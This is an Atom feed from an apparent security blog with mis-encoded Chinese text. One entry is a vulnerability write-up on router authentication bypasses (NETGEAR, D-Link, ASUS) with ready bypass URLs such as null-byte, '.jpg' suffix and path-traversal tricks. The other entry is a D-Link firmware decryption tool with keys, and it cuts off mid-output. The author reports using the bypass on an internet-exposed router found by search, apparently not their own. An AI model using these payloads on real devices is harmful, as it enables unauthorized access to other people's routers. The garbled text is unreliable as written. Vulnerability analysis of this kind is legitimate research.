<?xml version="1.0" encoding="utf-8"?>
<feed xmlns="http://www.w3.org/2005/Atom">
  <title>p1Kk&#39;s World!</title>
  
  <subtitle>è‰ºæ— æ­¢å¢ƒï¼ŒåŠŸä¸å”æã€‚</subtitle>
  <link href="atom.xml" rel="self"/>
  
  <link href="p1Kk.github.io/"/>
  <updated>2021-11-30T09:18:57.849Z</updated>
  <id>p1Kk.github.io/</id>
  
  <author>
    <name>p1Kk</name>
    
  </author>
  
  <generator uri="https://hexo.io/">Hexo</generator>
  
  <entry>
    <title>å¤šä¸ªè®¤è¯ç»•è¿‡æ¼æ´åˆ†æ</title>
    <link href="p1Kk.github.io/2021/11/30/iot/multiple_auth_bypass_vuln_analysis/"/>
    <id>p1Kk.github.io/2021/11/30/iot/multiple_auth_bypass_vuln_analysis/</id>
    <published>2021-11-29T16:00:00.000Z</published>
    <updated>2021-11-30T09:18:57.849Z</updated>
    
    <content type="html"><![CDATA[<p>ä¹‹å‰åªé’ˆå¯¹äº†CVE-2019-17137è¿›è¡Œäº†åˆ†æï¼Œåæ–‡æ–°å¢å…¶ä»–ç»•è¿‡æ¼æ´</p><h1 id="CVE-2019-17137"><a href="#CVE-2019-17137" class="headerlink" title="CVE-2019-17137"></a>CVE-2019-17137</h1><blockquote><p>æ­¤æ¼æ´å…è®¸ç½‘ç»œé‚»è¿‘æ”»å‡»è€…ç»•è¿‡å—å½±å“çš„NETGEAR AC1200 R6220å›ºä»¶ç‰ˆæœ¬1.1.0.86ï¼ˆåŠä¹‹å‰ï¼‰æ™ºèƒ½WiFiè·¯ç”±å™¨å®‰è£…çš„è®¤è¯ã€‚åˆ©ç”¨æ­¤æ¼æ´ä¸éœ€è¦èº«ä»½éªŒè¯ã€‚ç‰¹å®šçš„ç¼ºé™·å­˜åœ¨äºè·¯å¾„å­—ç¬¦ä¸²çš„å¤„ç†è¿‡ç¨‹ä¸­ã€‚é€šè¿‡åœ¨è·¯å¾„ä¸­æ’å…¥ä¸€ä¸ªnullå­—èŠ‚ï¼Œç”¨æˆ·å¯ä»¥è·³è¿‡å¤§å¤šæ•°èº«ä»½éªŒè¯æ£€æŸ¥ã€‚æ”»å‡»è€…å¯ä»¥åˆ©ç”¨è¿™ä¸ªæ¼æ´ç»•è¿‡ç³»ç»Ÿä¸Šçš„èº«ä»½éªŒè¯ã€‚</p></blockquote><h2 id="0x01"><a href="#0x01" class="headerlink" title="0x01"></a>0x01</h2><ul><li><p>å›ºä»¶ä¸‹è½½åœ°å€<br>v1.1.0.86(æ¼æ´ç‰ˆæœ¬): <a href="https://www.netgear.com/support/product/R6220.aspx#Firmware%20Version%201.1.0.86" target="_blank" rel="noopener">https://www.netgear.com/support/product/R6220.aspx#Firmware%20Version%201.1.0.86</a></p><p>v1.1.0.100(è¡¥ä¸ç‰ˆæœ¬): <a href="https://www.netgear.com/support/product/R6220.aspx#Firmware%20Version%201.1.0.100" target="_blank" rel="noopener">https://www.netgear.com/support/product/R6220.aspx#Firmware%20Version%201.1.0.100</a></p></li><li><p>æ¼æ´ä½ç½®ï¼š<code>/usr/sbin/mini_httpd</code></p></li><li><p>è¿™ä¸ªæ¼æ´æœ¬èº«æ¯”è¾ƒç®€å•ï¼Œä¸»è¦æ˜¯é€šè¿‡è¯¥æ¼æ´å­¦ä¹ ä¸€ä¸‹<strong>è¡¥ä¸å¯¹æ¯”ã€å·¥å…·</strong>ã€bindiffã€burpsuiteã€‘</p></li></ul><h2 id="0x02-bindiffæ¯”è¾ƒ"><a href="#0x02-bindiffæ¯”è¾ƒ" class="headerlink" title="0x02 bindiffæ¯”è¾ƒ"></a>0x02 bindiffæ¯”è¾ƒ</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">Call Graph-----------------------ä¸¤ä¸ªæ–‡ä»¶çš„å‡½æ•°è°ƒç”¨å›¾</span><br><span class="line">Matched Functions----------------ä¸¤ä¸ªæ–‡ä»¶çš„å‡½æ•°åŒ¹é…åº¦</span><br><span class="line">Primary Unmatched Functions------ä¸»è¦ä¸åŒ¹é…å‡½æ•°</span><br><span class="line">Secondary Unmatched Functions----æ¬¡è¦ä¸åŒ¹é…å‡½æ•°</span><br></pre></td></tr></table></figure><p>ä¸»è¦æŸ¥çœ‹è¿™å‡ ä¸ªæ²¡æœ‰å‡½æ•°åçš„å‡½æ•°</p><p><img src="https://raw.githubusercontent.com/p1Kk/blogImg/master/Picture/bindiff86vs100.png" alt></p><p>æœ‰çš„å‡½æ•°æ¯”è¾ƒåºå¤§ï¼Œæ ¹æ®å‡½æ•°æ¼æ´ï¼Œæ˜¯å› ä¸ºè·¯å¾„å­—ç¬¦ä¸²å¤„ç†é—®é¢˜ï¼Œæ‰€ä»¥å¯ä»¥åœ¨idaå­—ç¬¦ä¸²åˆ—è¡¨é‡Œæœç´¢ä¸€ä¸‹htmä¹‹ç±»çš„åç¼€ï¼Œç„¶åæŸ¥çœ‹å¼•ç”¨ï¼Œåœ¨ç‰ˆæœ¬100ä¸­æ‰¾åˆ°åœ¨å‡½æ•°<code>sub_00409774</code>ä¸­ï¼Œæ‰€ä»¥ç›´æ¥æŸ¥çœ‹è¿™é‡Œçš„å‡½æ•°æ¯”è¾ƒ</p><p><img src="https://raw.githubusercontent.com/p1Kk/blogImg/master/Picture/86100%E8%A1%A5%E4%B8%81.png" alt></p><p>åœ¨<code>0x0040B4A0 vs 0x0040B758</code>æ‰¾åˆ°äº†å¯ç–‘å˜é‡<code>a00</code></p><p>è§£è¯»ä¸€ä¸‹æ–°çš„è¡¥ä¸</p><p><img src="https://raw.githubusercontent.com/p1Kk/blogImg/master/Picture/%E8%A7%A3%E8%AF%BB%E8%A1%A5%E4%B8%81.png" alt></p><p>è€Œåœ¨æ¼æ´ç‰ˆæœ¬ä¸­ï¼Œå¹¶æ²¡æœ‰å¯¹00è¿›è¡Œæ£€æµ‹ï¼Œå¦‚æœé‡åˆ°00å°±ä¼šäº§ç”Ÿæˆªæ–­</p><p>æ¯”å¦‚å‘é€<code>/index.htm%00currentsetting.htm</code>ï¼Œå‡½æ•°å°±ä¼šæ£€æµ‹uriï¼Œåœ¨.dataä¸­å­˜æ”¾ç€æ— éœ€è®¤è¯å°±å¯ä»¥è®¿é—®çš„é¡µé¢ï¼Œæ£€æµ‹åˆ°uriä¸­å­˜åœ¨è¿™æ ·çš„é¡µé¢ï¼Œå°±å¼€å§‹è¿›è¡ŒURLè§£ç ï¼Œå­˜åœ¨%00äº§ç”Ÿæˆªæ–­ï¼Œå³è®¿é—®çš„æ˜¯index.htmï¼Œç”±äºç¨‹åºå·²ç»è®¤ä¸ºä¸éœ€è¦è®¤è¯ï¼Œæ‰€ä»¥å¯ä»¥ç›´æ¥è®¿é—®ã€‚</p><p>(netgearè¿˜å­˜åœ¨ç›´æ¥æ‹¼æ¥currentsetting.htmè¿›è¡Œç»•è¿‡çš„é—®é¢˜ï¼Œå¦‚é€šè¿‡<code>/aaa.cgi?todo=debug&amp;x=currentsetting.htm</code>è¿›è¡Œç»•è¿‡)</p><h2 id="0x03-æµ‹è¯•"><a href="#0x03-æµ‹è¯•" class="headerlink" title="0x03 æµ‹è¯•"></a>0x03 æµ‹è¯•</h2><p>å›ºä»¶æ¨¡æ‹Ÿæœ‰ç‚¹éº»çƒ¦â€¦ä½¿ç”¨fofaæœç´¢å…³é”®å­—<code>&quot;R6200&quot;</code></p><p><img src="https://raw.githubusercontent.com/p1Kk/blogImg/master/Picture/fofa6200.png" alt></p><p>è®¿é—®è¯¥ç½‘ç«™ï¼Œindex.htméœ€è¦è´¦å·å¯†ç æ‰èƒ½è®¿é—®ã€‚</p><p><img src="https://raw.githubusercontent.com/p1Kk/blogImg/master/Picture/R6200index401.png" alt></p><p>ç„¶åæŸ¥çœ‹currentsetting.htm ç‰ˆæœ¬ä¿¡æ¯é¡µé¢ï¼Œå¯ä»¥ç›´æ¥è®¿é—®ï¼Œå‘ç°è¯¥è·¯ç”±å™¨ç‰ˆæœ¬ä¸º34ï¼Œå±äºæ¼æ´ç‰ˆæœ¬ã€‚</p><p><img src="https://raw.githubusercontent.com/p1Kk/blogImg/master/Picture/R6200current.png" alt></p><p>é€šè¿‡burpæŠ“åŒ…ï¼Œä¿®æ”¹uriï¼Œè¾¾åˆ°ç›´æ¥è®¿é—®index.htmçš„è®¤è¯ç»•è¿‡ã€‚</p><p><img src="https://raw.githubusercontent.com/p1Kk/blogImg/master/Picture/R6200index200.png" alt></p><h1 id="CVE-2019-17373"><a href="#CVE-2019-17373" class="headerlink" title="CVE-2019-17373"></a>CVE-2019-17373</h1><blockquote><p>netgear</p></blockquote><p>å¯ä»¥ä½¿ç”¨</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">http://target/*.htm?x=1.jpg</span><br><span class="line">or</span><br><span class="line">http://target/*.cgi?A=a&amp;B=b&amp;...&amp;x=1.jpg</span><br></pre></td></tr></table></figure><p>è¿›è¡Œç»•è¿‡ï¼Œä¸»è¦æ˜¯å› ä¸ºç¨‹åºé€»è¾‘åŒ¹é…<code>.jpg</code>ç­‰å­—ç¬¦ä¸²</p><h1 id="PSV-2021-0133"><a href="#PSV-2021-0133" class="headerlink" title="PSV-2021-0133"></a>PSV-2021-0133</h1><blockquote><p>NETGEAR è®¤è¯ç»•è¿‡ï¼š<a href="https://ssd-disclosure.com/ssd-advisory-netgear-d7000-authentication-bypass/" target="_blank" rel="noopener">https://ssd-disclosure.com/ssd-advisory-netgear-d7000-authentication-bypass/</a></p></blockquote><p><code>mini_httpd</code></p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">LAB_000104f8:</span><br><span class="line">DAT_0001d4ec_needs_auth = <span class="number">0</span>;</span><br><span class="line">DAT_0001f24c = <span class="number">0</span>;</span><br><span class="line">&#125;</span><br><span class="line">pcVar4 = (<span class="keyword">char</span> *)FUN_0000b8f0(<span class="number">1</span>);</span><br><span class="line">iVar3 = strcasecmp(pcVar5,pcVar4);</span><br><span class="line"><span class="keyword">if</span> ((iVar3 == <span class="number">0</span>) &amp;&amp;</span><br><span class="line">(pcVar6 = <span class="built_in">strstr</span>(DAT_0001f330,<span class="string">"todo=PNPX_GetShareFolderList"</span>), pcVar6 != (<span class="keyword">char</span> *)<span class="number">0x0</span>)) &#123;</span><br><span class="line">DAT_0001d4ec_needs_auth = <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>å®ƒæ£€æŸ¥è¯·æ±‚è¡Œæ˜¯å¦åŒ…å«<code>todo=PNPX_GetShareFolderList</code>ï¼Œå¦‚æœåŒ…å«ï¼Œåˆ™å°†å˜é‡è®¾ç½®<code>DAT_0001d4ec</code>ä¸º 0ã€‚ä¼¼ä¹è¯¥å˜é‡ï¼ˆæˆ‘å·²å°†å…¶é‡å‘½åä¸º<code>_needs_auth</code>ï¼‰ç”¨äºæ£€æŸ¥è®¿é—®è¯·æ±‚çš„èµ„æºæ˜¯å¦éœ€è¦èº«ä»½éªŒè¯ã€‚å¦‚æœè®¾ç½®ä¸º 0ï¼Œåˆ™æ— éœ€ç”¨æˆ·åå’Œå¯†ç å³å¯æä¾›èµ„æºã€‚</p><p>ç”±äºå®ƒä½¿ç”¨strstræ¥æ£€æŸ¥ï¼Œæ‰€ä»¥å­—ç¬¦ä¸²éœ€è¦å‡ºç°åœ¨åŸå§‹è¯·æ±‚è¡Œä¸­ï¼Œä½†æ²¡æœ‰æ£€æŸ¥è¯·æ±‚è¡Œæ˜¯å¦åŒ…å«å…¶ä»–å†…å®¹ã€‚</p><p>è¿™æ„å‘³ç€æˆ‘ä»¬å¯ä»¥åœ¨ Web æœåŠ¡å™¨ä¸Šè¯·æ±‚ä»»ä½•æ— éœ€èº«ä»½éªŒè¯çš„æ–‡ä»¶ï¼ŒåŒ…æ‹¬é…ç½®æ–‡ä»¶å’ŒæŠ«éœ²ç®¡ç†ç”¨æˆ·å¯†ç çš„ç½‘é¡µã€‚</p><h1 id="CVE-2020-8864"><a href="#CVE-2020-8864" class="headerlink" title="CVE-2020-8864"></a>CVE-2020-8864</h1><blockquote><p>D-Link DIR-882ã€DIR-878 å’Œ DIR-867è·¯ç”±å™¨</p></blockquote><p><img src="https://cdn.jsdelivr.net/gh/p1Kk/blogImg/Pictureimage-20211130165129657.png" alt="image-20211130165129657"></p><p><code>login_result_424090</code></p><p><img src="https://cdn.jsdelivr.net/gh/p1Kk/blogImg/Pictureimage-20210903104142396.png" alt="image-20210903104142396"></p><h1 id="CVE-2020-8863"><a href="#CVE-2020-8863" class="headerlink" title="CVE-2020-8863"></a>CVE-2020-8863</h1><blockquote><p>D-Link DIR-882ã€DIR-878 å’Œ DIR-867è·¯ç”±å™¨ï¼šè®¤è¯ç»•è¿‡ã€åé—¨</p></blockquote><p><img src="https://cdn.jsdelivr.net/gh/p1Kk/blogImg/Pictureimage-20210903110342507.png" alt="image-20210903110342507"></p><h1 id="CVE-2020-15633"><a href="#CVE-2020-15633" class="headerlink" title="CVE-2020-15633"></a>CVE-2020-15633</h1><p><img src="https://cdn.jsdelivr.net/gh/p1Kk/blogImg/Pictureimage-20210903112743060.png" alt="image-20210903112743060"></p><p>Getcaptchasett</p><p><img src="https://cdn.jsdelivr.net/gh/p1Kk/blogImg/Pictureimage-20210903112857644.png" alt="image-20210903112857644"></p><p>åœ¨<code>main</code>å‡½æ•°ä¸­å¯ä»¥çœ‹å‡ºï¼Œ56ä½æ˜¯REQUEST_URIï¼Œå› æ­¤ï¼Œè¯·æ±‚urlä¸­åŒ…å«Getcaptchasettåˆ—è¡¨ä¸­çš„uriå³å¯å®ç°ç»•è¿‡</p><p><img src="https://cdn.jsdelivr.net/gh/p1Kk/blogImg/Pictureimage-20211130165814696.png" alt="image-20211130165814696"></p><h1 id="CVE-2021-35973"><a href="#CVE-2021-35973" class="headerlink" title="CVE-2021-35973"></a>CVE-2021-35973</h1><blockquote><p>WAC104  version&lt;v1.0.4.15ä¸­ï¼Œ%00é—®é¢˜</p></blockquote><p>ç›®æ ‡æ–‡ä»¶ï¼š<code>/usr/sbin/mini_httpd</code></p><p><img src="https://cdn.jsdelivr.net/gh/p1Kk/blogImg/Pictureimage-20211130171757281.png" alt="image-20211130171757281"></p><p><img src="https://cdn.jsdelivr.net/gh/p1Kk/blogImg/Pictureimage-20211130171816418.png" alt="image-20211130171816418"></p><p><img src="https://cdn.jsdelivr.net/gh/p1Kk/blogImg/Pictureimage-20211130171837116.png" alt="image-20211130171837116"></p><p>å¯¹/ . ..å’Œç‰¹æ®Šå­—ç¬¦è¿›è¡Œäº†æ£€éªŒï¼Œä½†æ²¡æœ‰æ£€éªŒ%00</p><h1 id="CVE-2021-32030"><a href="#CVE-2021-32030" class="headerlink" title="CVE-2021-32030"></a>CVE-2021-32030</h1><blockquote><p>ASUS RT-AX56Uè·¯ç”±å™¨èº«ä»½éªŒè¯ç»•è¿‡</p></blockquote><p>ç›®æ ‡æ–‡ä»¶ï¼š<code>/usr/sbin/httpd</code></p><p><img src="https://cdn.jsdelivr.net/gh/p1Kk/blogImg/Pictureimage-20210819000010058.png" alt="image-20210819000010058"></p><p>åœ¨è®¾å¤‡çš„é»˜è®¤é…ç½®ä¸‹ï¼ŒIFTTT åŠŸèƒ½æ²¡æœ‰å¼€å¯ï¼Œ ifttt_token é»˜è®¤ä¸ºç©º</p><p>å¦‚æœç”¨æˆ·ä¼ å…¥çš„ asus_token ä¹Ÿæ˜¯ç©ºå€¼ï¼Œåˆ™ strcmp ä¼šè¿”å› 0 è¡¨ç¤ºæ¯”è¾ƒæˆåŠŸï¼Œè¿™æ ·å°±èƒ½ç»•è¿‡åç»­çš„æ£€æŸ¥ï¼Œå®ç°èº«ä»½éªŒè¯ç»•è¿‡ã€‚</p><h1 id="CVE-2021-20090"><a href="#CVE-2021-20090" class="headerlink" title="CVE-2021-20090"></a>CVE-2021-20090</h1><blockquote><p>ASUS DCS-AC88U</p></blockquote><p>ç›®æ ‡æ–‡ä»¶ï¼š<code>/usr/sbin/httpd</code></p><p><img src="https://cdn.jsdelivr.net/gh/p1Kk/blogImg/Pictureimage-20210820094933867.png" alt="image-20210820094933867"></p><p><img src="https://cdn.jsdelivr.net/gh/p1Kk/blogImg/Pictureimage-20210820095318853.png" alt="image-20210820095318853"></p><p><img src="https://cdn.jsdelivr.net/gh/p1Kk/blogImg/Pictureimage-20210820101158404.png" alt="image-20210820101158404"></p><p><code>process_post</code> -&gt; â€¦ -&gt;<code>sub_167A8</code></p><p><img src="https://cdn.jsdelivr.net/gh/p1Kk/blogImg/Pictureimage-20210820100601882.png" alt="image-20210820100601882"></p><p>æŠŠ ../ åçš„urlæ”¾åˆ°å¼€å¤´ï¼Œå› æ­¤å¦‚æœè¯·æ±‚<code>/images/../aaa.cgi</code>  ==&gt; <code>/aaa.cgi</code>å³å¯ç»•è¿‡</p><blockquote><p>reference</p><p><a href="https://www.anquanke.com/post/id/227623" target="_blank" rel="noopener">https://www.anquanke.com/post/id/227623</a></p></blockquote>]]></content>
    
    
      
      
    <summary type="html">&lt;p&gt;ä¹‹å‰åªé’ˆå¯¹äº†CVE-2019-17137è¿›è¡Œäº†åˆ†æï¼Œåæ–‡æ–°å¢å…¶ä»–ç»•è¿‡æ¼æ´&lt;/p&gt;
&lt;h1 id=&quot;CVE-2019-17137&quot;&gt;&lt;a href=&quot;#CVE-2019-17137&quot; class=&quot;headerlink&quot; title=&quot;CVE-2019-17137&quot;&gt;&lt;/a&gt;</summary>
      
    
    
    
    <category term="æ¼æ´å¤ç°" scheme="p1Kk.github.io/categories/æ¼æ´å¤ç°/"/>
    
    
    <category term="iot" scheme="p1Kk.github.io/tags/iot/"/>
    
    <category term="è·¯ç”±å™¨" scheme="p1Kk.github.io/tags/è·¯ç”±å™¨/"/>
    
    <category term="cve" scheme="p1Kk.github.io/tags/cve/"/>
    
    <category term="è®¤è¯ç»•è¿‡" scheme="p1Kk.github.io/tags/è®¤è¯ç»•è¿‡/"/>
    
  </entry>
  
  <entry>
    <title>Dlink DIR-850L å›ºä»¶åŠ è§£å¯†</title>
    <link href="p1Kk.github.io/2021/06/18/iot/Dlink%20DIR-850L%E5%9B%BA%E4%BB%B6%E5%8A%A0%E8%A7%A3%E5%AF%86/"/>
    <id>p1Kk.github.io/2021/06/18/iot/Dlink%20DIR-850L%E5%9B%BA%E4%BB%B6%E5%8A%A0%E8%A7%A3%E5%AF%86/</id>
    <published>2021-06-17T16:00:00.000Z</published>
    <updated>2021-08-29T15:29:13.521Z</updated>
    
    <content type="html"><![CDATA[<p>å›ºä»¶ä¸‹è½½åœ°å€ï¼š<a href="http://files.dlink.com.au/Products/DIR-850L/REV_B/Firmware/Firmware_v2.20b03/DIR850LB1_FW220WWb03.bin" target="_blank" rel="noopener">http://files.dlink.com.au/Products/DIR-850L/REV_B/Firmware/Firmware_v2.20b03/DIR850LB1_FW220WWb03.bin</a></p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">$</span><span class="bash"> binwalk DIR850LB1_FW220WWb03.bin </span></span><br><span class="line"></span><br><span class="line">DECIMAL       HEXADECIMAL     DESCRIPTION</span><br><span class="line">--------------------------------------------------------------------------------</span><br></pre></td></tr></table></figure><p>binwalkå¹¶æ²¡æœ‰åˆ†æå‡ºä»€ä¹ˆä¸œè¥¿ï¼Œè¿™å¯èƒ½æ˜¯ä¸€ä¸ªåŠ å¯†æ–‡ä»¶ã€‚æˆ‘ä»¬éœ€è¦ç”¨åˆ°binwalkçš„<code>-E</code>å‚æ•°ï¼ŒæŸ¥çœ‹è¯¥å›ºä»¶çš„<strong>ç†µ</strong>ã€‚è®¡ç®—ç†µæ˜¯ä¸€ç§æ„ŸçŸ¥ç»™å®šå­—èŠ‚åºåˆ—æ˜¯å¦å‹ç¼©æˆ–åŠ å¯†çš„æœ‰æ•ˆæ‰‹æ®µã€‚<strong>ç†µå€¼å¤§ï¼Œæ„å‘³ç€æœ‰å¯èƒ½æ˜¯åŠ å¯†çš„æˆ–æ˜¯å‹ç¼©è¿‡çš„ã€‚ç†µå€¼ä½ï¼Œåˆ™æ­£å¥½ç›¸åã€‚</strong>ä¸è¿‡ï¼Œå³ä½¿å¾—åˆ°å…·ä½“çš„ç†µå€¼ï¼Œä¹Ÿå¹¶ä¸æ˜¯æ€»èƒ½ç«‹åˆ»å¾—åˆ°å‡†ç¡®çš„åˆ¤æ–­ã€‚</p><h1 id="è§£å¯†old-version"><a href="#è§£å¯†old-version" class="headerlink" title="è§£å¯†old version"></a>è§£å¯†old version</h1><p>åœ¨<a href="https://pierrekim.github.io/blog/2017-09-08-dlink-850l-mydlink-cloud-0days-vulnerabilities.htmlä¸­å¯ä»¥å­¦åˆ°ï¼š" target="_blank" rel="noopener">https://pierrekim.github.io/blog/2017-09-08-dlink-850l-mydlink-cloud-0days-vulnerabilities.htmlä¸­å¯ä»¥å­¦åˆ°ï¼š</a></p><p>DIR850LA1_FW114WWb07.binæ˜¯æ²¡æœ‰è¢«åŠ å¯†çš„ï¼Œç›´æ¥è§£å‹åï¼Œåé¢ç‰ˆæœ¬çš„åŠ å¯†key <code>wrgac05_dlob.hans_dir850l</code> å°±å­˜åœ¨äºå›ºä»¶ç³»ç»Ÿç›®å½•ä¸‹çš„<code>/etc/config</code>çš„<code>fw_sign</code>æˆ–<code>image_sign</code>ä¸­ï¼Œä¸€èˆ¬æ¥è¯´åŒä¸€å‹å·ä¸åŒç‰ˆæœ¬çš„è·¯ç”±å™¨çš„keyéƒ½æ˜¯ä¸€æ ·çš„ã€‚åˆ©ç”¨æ–‡ä¸­çš„è§£å¯†æ–¹æ³•</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/* </span></span><br><span class="line"><span class="comment"> * Simple tool to decrypt D-LINK DIR-850L REVB firmwares </span></span><br><span class="line"><span class="comment"> *</span></span><br><span class="line"><span class="comment"> * $ gcc -o revbdec revbdec.c</span></span><br><span class="line"><span class="comment"> * $ ./revbdec DIR850L_REVB_FW207WWb05_h1ke_beta1.bin wrgac25_dlink.2013gui_dir850l &gt; DIR850L_REVB_FW207WWb05_h1ke_beta1.decrypted</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;sys/types.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;sys/stat.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;fcntl.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;unistd.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;string.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> USAGE <span class="meta-string">"Usage: decimg &lt;filename&gt; &lt;key&gt;\n"</span></span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">(<span class="keyword">int</span>    argc,</span></span></span><br><span class="line"><span class="function"><span class="params">         <span class="keyword">char</span>   **argv)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">        <span class="keyword">int</span>     i, fi;</span><br><span class="line">        <span class="keyword">int</span>     fo = STDOUT_FILENO, fe = STDERR_FILENO;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span> (argc != <span class="number">3</span>)</span><br><span class="line">        &#123;</span><br><span class="line">                write(fe, USAGE, <span class="built_in">strlen</span>(USAGE));</span><br><span class="line">                <span class="keyword">return</span> (EXIT_FAILURE);</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span> ((fi = open(argv[<span class="number">1</span>], O_RDONLY)) == <span class="number">-1</span>)</span><br><span class="line">        &#123;</span><br><span class="line">                perror(<span class="string">"open"</span>);</span><br><span class="line">                write(fe, USAGE, <span class="built_in">strlen</span>(USAGE));</span><br><span class="line">                <span class="keyword">return</span> (EXIT_FAILURE);</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">const</span> <span class="keyword">char</span> *key = argv[<span class="number">2</span>];</span><br><span class="line">        <span class="keyword">int</span> kl = <span class="built_in">strlen</span>(key);</span><br><span class="line"></span><br><span class="line">        i = <span class="number">0</span>;</span><br><span class="line">        <span class="keyword">while</span> (<span class="number">1</span>)</span><br><span class="line">        &#123;</span><br><span class="line">                <span class="keyword">char</span> buffer[<span class="number">4096</span>];</span><br><span class="line">                <span class="keyword">int</span> j, len;</span><br><span class="line">                len = read(fi, buffer, <span class="number">4096</span>);</span><br><span class="line">                <span class="keyword">if</span> (len &lt;= <span class="number">0</span>)</span><br><span class="line">                        <span class="keyword">break</span>;</span><br><span class="line">                <span class="keyword">for</span> (j = <span class="number">0</span>; j &lt; len; j++) &#123;</span><br><span class="line">                        buffer[j] ^= (i + j) % <span class="number">0xFB</span> + <span class="number">1</span>;</span><br><span class="line">                        buffer[j] ^= key[(i + j) % kl];</span><br><span class="line">                &#125;</span><br><span class="line">                write(fo, buffer, len);</span><br><span class="line">                i += len;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">       <span class="keyword">return</span> (EXIT_SUCCESS);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>ç¼–è¯‘åè¿›è¡Œå°è¯•è§£å¯†åŸæ–‡æµ‹è¯•çš„å›ºä»¶</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">$</span><span class="bash"> ./revbdec DIR850LB1_FW207WWb05.bin wrgac05_dlob.hans_dir850l &gt; DIR850LB1_FW207WWb05.decrypted</span></span><br><span class="line"><span class="meta">$</span><span class="bash"> binwalk DIR850LB1_FW207WWb05.decrypted </span></span><br><span class="line"></span><br><span class="line">DECIMAL       HEXADECIMAL     DESCRIPTION</span><br><span class="line">--------------------------------------------------------------------------------</span><br></pre></td></tr></table></figure><p>å¤±è´¥ï¼Œè¿™æ˜¯ä¸ºä»€ä¹ˆï¼Ÿå› ä¸ºæˆ‘æ‰¾åˆ°çš„keyå’ŒåŸæ–‡ä¸­çš„key<code>wrgac25_dlink.2013gui_dir850l</code>å¹¶ä¸ç›¸åŒï¼Œçœ‹æ¥åŒä¸€ä¸ªå‹å·çš„å›ºä»¶keyä¹Ÿä¼šä¸åŒ</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">$</span><span class="bash"> ./revbdec DIR850LB1_FW207WWb05.bin wrgac25_dlink.2013gui_dir850l &gt; DIR850LB1_FW207WWb05.decrypted</span></span><br><span class="line"><span class="meta">$</span><span class="bash"> binwalk DIR850LB1_FW207WWb05.decrypted </span></span><br><span class="line"></span><br><span class="line">DECIMAL       HEXADECIMAL     DESCRIPTION</span><br><span class="line">--------------------------------------------------------------------------------</span><br><span class="line">0             0x0             DLOB firmware header, boot partition: "dev=/dev/mtdblock/1"</span><br><span class="line">10380         0x288C          LZMA compressed data, properties: 0x5D, dictionary size: 8388608 bytes, uncompressed size: 5184868 bytes</span><br><span class="line">1704052       0x1A0074        PackImg section delimiter tag, little endian size: 10517760 bytes; big endian size: 8232960 bytes</span><br><span 